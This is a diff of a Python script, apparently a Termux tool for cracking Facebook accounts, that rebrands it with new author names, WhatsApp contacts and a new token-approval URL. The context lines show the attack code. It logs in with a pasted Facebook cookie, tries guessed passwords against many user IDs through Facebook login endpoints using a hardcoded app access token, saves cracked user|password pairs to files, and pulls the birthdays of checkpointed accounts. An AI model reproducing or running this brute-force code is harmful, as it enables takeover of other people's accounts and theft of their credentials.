@@ -1,4 +1,4 @@
-mm.p#!/usr/bin/python3
+#!/usr/bin/python3
 #-*-coding:utf-8-*-
 # Update V1.6
 
@@ -125,7 +125,7 @@ def reg():
         to = open('/sdcard/Android/.bs7nt.txt', 'r').read()
     except (KeyError, IOError):
         reg2()
-    r = requests.get('https://raw.githubusercontent.com/Shuvo-BBHH/G-file/main/aprv.text').text
+    r = requests.get('https://github.com/Tremux-Suman/approval.txt/blob/main/approval.txt').text
     if to in r:
         time.sleep(2)
         bsn_menu()
@@ -138,7 +138,7 @@ def reg():
         print ('  \033[1;97mTOKEN: ' + to)
         input('\033[1;97m  TEKAN ENTER UNTUK MENGIRIM TOKEN BANGSAT')
         print(' VISI MISI FOYA FOYA THE CHANGCUTERS ')
-        os.system('xdg-open https://wa.me/+8801616406924?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
+        os.system('xdg-open https://wa.me/+62819077601235?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
         reg()
 
 def reg2():
@@ -149,9 +149,9 @@ def reg2():
     print('')
     id = uuid.uuid4().hex[:50]
     print (' TOKEN : ' + id)
-    print(' WHATSAPP : +8801616406924')
+    print(' WHATSAPP : 0819-0776-1235')
     input(' Press Enter To Send Token ')
-    os.system('xdg-open https://wa.me/+8801616406924?text=Assalamualaikum Sir Approve my Token and my Token :'+id)
+    os.system('xdg-open https://wa.me/+62819077601235?text=Assalamualaikum Sir Approve my Token and my Token :'+id)
     sav = open('/sdcard/Android/.bs7nt.txt', 'w')
     sav.write(id)
     sav.close()
@@ -165,7 +165,7 @@ def chigozie():
     print (' %s*%s tools ini menggunakan login cookies facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
     cookie = input("\n %s[%s?%s] Cookies : %s"% (O,O,O,O))
     if cookie in['OPEN','Open','open']:
-      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+8801616406924');chigozie()
+      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+2348069472717');chigozie()
     try:
         head={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': cookie}
         asww=requests.get("https://business.facebook.com/creatorstudio/home", headers=head)
@@ -177,7 +177,7 @@ def chigozie():
         print('\n\n %s*%s selamat datang %s%s%s'%(O,O,O,nama,O));time.sleep(2)
         print(' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,O));time.sleep(2)
         input(' %s*%s tekan enter '%(O,O))
-        os.system('xdg-open https://wa.me/+8801616406924')
+        os.system('xdg-open https://wa.me/+2348069472717')
         bsn_menu()
     except AttributeError:
         print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
@@ -202,12 +202,12 @@ def bsn_menu():
     logo()
     ipm = requests.get(url_ip).json() 
     IP = ipm["origin"]
-    print(" [*]. CREATED BY |:-( Bk4human )");time.sleep (0.03)
-    print(" [*]. Tysm To My All Frendz. (MAHDI HASAN)");time.sleep (0.03)
+    print(" [*]. CREATED BY |:-( A D F )");time.sleep (0.03)
+    print(" [*]. Tysm To My All Frendz. (Waqar BILAL)");time.sleep (0.03)
     print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
     print(" [*]. VERSION  1.0                                    ");time.sleep (0.03)   
-    print(" [*]. WP             +8801616406924       ");time.sleep (0.03)
-    print(" [*]. This Tool was made in Bangladesh                 ");time.sleep (0.03)
+    print(" [*]. WP             +923491383368       ");time.sleep (0.03)
+    print(" [*]. This Tool was made in Pakistan                 ");time.sleep (0.03)
     print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
     print(".[*] ---------------------------------------------");time.sleep(0.03)
     print(" [*] A N O N Y M O U S  D A R K F A T E  ( A D F )    ");time.sleep (0.03)
@@ -225,7 +225,6 @@ def bsn_menu():
     pepek = input(' Select : ')
     if pepek in['1','01']:
         __bsn__().bilo(id)
-    
             
 
 class __bsn__:
@@ -261,7 +260,7 @@ class __bsn__:
     def __api__(self, user, __chi__):
         global ok,cp,loop
         for i in list('\|-/'):
-            sys.stdout.write(f'\r [MAHDI] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
+            sys.stdout.write(f'\r [CHANG] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
             sys.stdout.flush()
         for pw in __chi__:
             pw = pw.lower()
@@ -269,7 +268,7 @@ class __bsn__:
             except: pass
             p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
             if "access_token" in p:
-                print('\r [OK-MAHDI] %s | %s ' % (user,pw))
+                print('\r [OK-CHANG] %s | %s ' % (user,pw))
                 wrt = '%s|%s' % (user,pw)
                 ok.append(wrt)
                 open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
@@ -280,7 +279,7 @@ class __bsn__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print('\r%s \033[1;91m[CP-MAHDI] %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;91m[CP-CHANG] %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
                     open('chang-cp.txt' , 'a').write('%s\n' % wrt)
@@ -291,7 +290,7 @@ class __bsn__:
                     year  = ''
                 except:
                     pass
-                print('\r%s \033[1;91m[CP-MAHDI] %s | %s ' % (K,user,pw))
+                print('\r%s \033[1;91m[CP-CHANG] %s | %s ' % (K,user,pw))
                 wrt = '%s|%s' % (user,pw)
                 cp.append(wrt)
                 open('chang-cp.txt' , 'a').write('%s\n' % wrt)
@@ -302,7 +301,7 @@ class __bsn__:
 
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f'\r [MAHDI] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
+        sys.stdout.write(f'\r [CHANG] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -352,7 +351,7 @@ class __bsn__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f'\r{H} [OK-MAHDI] {user} | {pw}')
+                    print(f'\r{H} [OK-CHANG] {user} | {pw}')
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
                     open('chang-ok.txt' , 'a').write('%s\n' % wrt)
@@ -364,7 +363,7 @@ class __bsn__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s \033[1;91m[CP-MAHDI] %s | %s ' % (K,user,pw))
+                        print('\r%s \033[1;91m[CP-CHANG] %s | %s ' % (K,user,pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
                         open('chang-cp.txt' , 'a').write('%s\n' % wrt)
@@ -374,7 +373,7 @@ class __bsn__:
                         day   = ''
                         year  = ''
                     except:pass
-                    print('\r%s \033[1;91m[CP-MAHDI] %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;91m[CP-CHANG] %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
                     open('chang-cp.txt' , 'a').write('%s\n' % wrt)
